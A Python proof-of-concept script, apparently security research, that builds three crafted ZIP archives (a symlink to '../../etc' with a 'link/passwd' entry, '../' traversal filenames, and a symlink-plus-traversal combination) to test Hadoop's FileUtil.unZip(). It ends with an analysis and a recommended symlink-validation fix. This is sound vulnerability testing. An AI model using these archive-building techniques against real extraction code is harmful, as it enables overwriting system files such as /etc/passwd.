#!/usr/bin/env python3
"""
Proof of Concept: ZIP Symlink Path Traversal Attack
Tests whether Hadoop's FileUtil.unZip() is vulnerable to symlink attacks
"""

import zipfile
import os
import stat
import tempfile
import shutil

def create_malicious_zip_method1(output_zip):
    """
    Method 1: Create a ZIP with a symlink pointing outside the extraction directory,
    then try to write through it.

    Attack scenario:
    1. Create symlink 'link' -> '../../etc'
    2. Create file 'link/passwd' with malicious content

    If vulnerable, this would write to /etc/passwd
    """
    print(f"\n[*] Creating malicious ZIP: {output_zip}")
    print("[*] Attack: Symlink escape to write outside destination")

    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a symlink pointing outside
        symlink_path = os.path.join(tmpdir, 'link')
        # Point to parent's parent (../../etc)
        os.symlink('../../etc', symlink_path)

        # Create a regular file
        malicious_file = os.path.join(tmpdir, 'malicious.txt')
        with open(malicious_file, 'w') as f:
            f.write('MALICIOUS CONTENT - THIS SHOULD NOT BE WRITTEN!\n')

        # Create ZIP preserving symlinks
        with zipfile.ZipFile(output_zip, 'w') as zf:
            # Add symlink
            # Get the symlink info
            link_info = zipfile.ZipInfo('link')
            link_info.external_attr = (stat.S_IFLNK | 0o755) << 16  # Mark as symlink
            zf.writestr(link_info, '../../etc')  # Symlink target

            # Add a file that would write through the symlink
            zf.write(malicious_file, 'link/passwd')

    print(f"[+] Created {output_zip}")
    print("[+] Contents:")
    with zipfile.ZipFile(output_zip, 'r') as zf:
        for info in zf.infolist():
            attrs = info.external_attr >> 16
            file_type = "symlink" if stat.S_ISLNK(attrs) else "file"
            print(f"    {info.filename} ({file_type})")

def create_malicious_zip_method2(output_zip):
    """
    Method 2: Direct path traversal in filename

    Attack scenario:
    1. Create file '../../etc/passwd' directly

    If vulnerable, this would write to /etc/passwd
    """
    print(f"\n[*] Creating malicious ZIP: {output_zip}")
    print("[*] Attack: Direct path traversal in filename")

    with zipfile.ZipFile(output_zip, 'w') as zf:
        # Try to escape via path traversal in filename
        zf.writestr('../../../../../../tmp/MALICIOUS_FILE.txt',
                   'ESCAPED VIA PATH TRAVERSAL!')
        zf.writestr('../MALICIOUS_FILE2.txt',
                   'ESCAPED VIA PARENT!')

    print(f"[+] Created {output_zip}")

def create_malicious_zip_method3(output_zip):
    """
    Method 3: Symlink pointing inside, then traverse through it

    Attack scenario:
    1. Create directory 'safe'
    2. Create symlink 'link' -> 'safe'
    3. Create file 'link/../../etc/passwd'

    If vulnerable and symlink is created, traversal through it might work
    """
    print(f"\n[*] Creating malicious ZIP: {output_zip}")
    print("[*] Attack: Symlink inside dir + traversal through symlink")

    with tempfile.TemporaryDirectory() as tmpdir:
        # Create directory structure
        safe_dir = os.path.join(tmpdir, 'safe')
        os.makedirs(safe_dir)

        # Create symlink pointing to safe (inside extraction dir)
        symlink_path = os.path.join(tmpdir, 'link')
        os.symlink('safe', symlink_path)

        # Create a test file
        test_file = os.path.join(tmpdir, 'test.txt')
        with open(test_file, 'w') as f:
            f.write('Test content\n')

        with zipfile.ZipFile(output_zip, 'w') as zf:
            # Add directory
            zf.writestr('safe/', '')

            # Add symlink pointing to safe
            link_info = zipfile.ZipInfo('link')
            link_info.external_attr = (stat.S_IFLNK | 0o755) << 16
            zf.writestr(link_info, 'safe')

            # Try to traverse through the symlink
            zf.write(test_file, 'link/../../../../../../tmp/ESCAPED_THROUGH_SYMLINK.txt')

    print(f"[+] Created {output_zip}")

def analyze_zip_structure(zip_path):
    """Analyze and display ZIP file structure"""
    print(f"\n[*] Analyzing ZIP structure: {zip_path}")
    print("-" * 60)

    with zipfile.ZipFile(zip_path, 'r') as zf:
        for info in zf.infolist():
            attrs = info.external_attr >> 16
            is_symlink = stat.S_ISLNK(attrs)
            is_dir = info.filename.endswith('/')

            print(f"Filename: {info.filename}")
            print(f"  External attr: 0x{info.external_attr:08x}")
            print(f"  Mode: 0o{attrs:o}")
            print(f"  Type: ", end='')

            if is_symlink:
                print("SYMLINK")
                # Read the symlink target
                target = zf.read(info.filename).decode('utf-8')
                print(f"  Target: {target}")
            elif is_dir:
                print("DIRECTORY")
            else:
                print("REGULAR FILE")
                print(f"  Size: {info.file_size} bytes")

            print()

def test_extraction_with_python(zip_path):
    """
    Test extraction using Python's zipfile module to see default behavior
    """
    print(f"\n[*] Testing extraction with Python's zipfile: {zip_path}")
    print("-" * 60)

    extract_dir = tempfile.mkdtemp(prefix='zip_test_')
    print(f"[*] Extracting to: {extract_dir}")

    try:
        with zipfile.ZipFile(zip_path, 'r') as zf:
            for info in zf.infolist():
                print(f"[*] Extracting: {info.filename}")
                try:
                    zf.extract(info, extract_dir)
                    extracted_path = os.path.join(extract_dir, info.filename)

                    # Check what was created
                    if os.path.exists(extracted_path):
                        if os.path.islink(extracted_path):
                            target = os.readlink(extracted_path)
                            print(f"    -> Created symlink: {extracted_path} -> {target}")
                        elif os.path.isdir(extracted_path):
                            print(f"    -> Created directory: {extracted_path}")
                        else:
                            print(f"    -> Created file: {extracted_path}")
                            with open(extracted_path, 'r') as f:
                                content = f.read()[:100]
                                print(f"    -> Content preview: {content}")
                    else:
                        print(f"    -> Nothing created at {extracted_path}")
                        # Check if it escaped
                        canonical = os.path.realpath(extracted_path)
                        if os.path.exists(canonical):
                            print(f"    -> WARNING: File created at {canonical}")

                except Exception as e:
                    print(f"    -> ERROR: {e}")

        # List what was actually created
        print(f"\n[*] Contents of extraction directory:")
        for root, dirs, files in os.walk(extract_dir):
            level = root.replace(extract_dir, '').count(os.sep)
            indent = ' ' * 2 * level
            print(f"{indent}{os.path.basename(root)}/")
            subindent = ' ' * 2 * (level + 1)
            for file in files:
                file_path = os.path.join(root, file)
                if os.path.islink(file_path):
                    target = os.readlink(file_path)
                    print(f"{subindent}{file} -> {target} (symlink)")
                else:
                    print(f"{subindent}{file}")

    finally:
        print(f"\n[*] Cleaning up: {extract_dir}")
        shutil.rmtree(extract_dir)

def main():
    print("=" * 60)
    print("ZIP Symlink Path Traversal - Proof of Concept")
    print("=" * 60)

    # Create test ZIPs
    zip1 = 'malicious_symlink_escape.zip'
    zip2 = 'malicious_direct_traversal.zip'
    zip3 = 'malicious_symlink_traversal.zip'

    create_malicious_zip_method1(zip1)
    analyze_zip_structure(zip1)
    test_extraction_with_python(zip1)

    create_malicious_zip_method2(zip2)
    analyze_zip_structure(zip2)
    test_extraction_with_python(zip2)

    create_malicious_zip_method3(zip3)
    analyze_zip_structure(zip3)
    test_extraction_with_python(zip3)

    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    print("""
This PoC demonstrates potential ZIP path traversal attacks:

1. Symlink Escape (Method 1):
   - Creates a symlink pointing outside the extraction directory
   - Python's zipfile.extract() does NOT create symlinks by default
   - It extracts symlink entries as regular files containing the target path
   - Therefore, NOT vulnerable with standard Python extraction

2. Direct Path Traversal (Method 2):
   - Uses '..' in filenames to escape the extraction directory
   - Python's zipfile.extract() uses os.path.join() which normalizes paths
   - Vulnerable to path traversal in older Python versions
   - Modern Python (3.x) typically sanitizes paths

3. Symlink + Traversal (Method 3):
   - Combines symlink creation with path traversal
   - Again, Python doesn't create actual symlinks by default

HADOOP FileUtil.unZip() ANALYSIS:
- Uses Apache Commons Compress ZipArchiveEntry
- Has path traversal protection via getCanonicalPath() check
- Does NOT check for or handle symlinks explicitly
- Question: Does Apache Commons Compress create actual symlinks?
  * If YES -> VULNERABLE (no symlink target validation)
  * If NO -> SAFE (symlinks extracted as regular files)

RECOMMENDATION:
Add symlink detection and validation similar to unTar():
1. Check if entry is a symlink (using Unix external attributes)
2. If symlink, validate the target path is within destination
3. Only then create the symlink
""")

if __name__ == '__main__':
    main()
